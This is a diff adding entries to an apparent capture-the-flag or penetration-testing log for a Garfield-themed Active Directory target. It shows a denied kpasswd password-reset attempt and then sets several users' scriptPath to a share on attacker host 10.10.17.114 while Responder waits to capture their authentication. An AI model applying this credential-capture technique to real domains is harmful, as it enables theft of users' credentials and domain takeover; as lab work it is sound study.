@@ -283,3 +283,20 @@ How do we get l.wilson's credentials? Every path leads here:
 - The ONLY thing we can do is SET HER SCRIPTPATH and write to SYSVOL
 
 Something about the Garfield theme or the scriptPath mechanism is the key we're missing.
+
+## 10:31 — Focused scriptPath Engine Run (10 iterations)
+
+### Iteration 0: kpasswd5 password reset
+- changepasswd.py -protocol kpasswd -reset -altuser j.arbuckle → access denied
+- kpasswd checks same ACL as SAMR — no password change rights
+- **HARD BLOCK: kpasswd also denied**
+
+## 10:36 — Manual scriptPath + Responder Setup
+- Set scriptPath = \\10.10.17.114\share\x.bat on:
+  - l.wilson ✓
+  - l.wilson_adm ✓  
+  - krbtgt_8245 ✓
+  - administrator DENIED (protected or different ACL)
+- Responder running on tun0, listening for auth
+- Engine still running in parallel (iteration 1+)
+- kpasswd5 test: access denied (same ACL as SAMR)
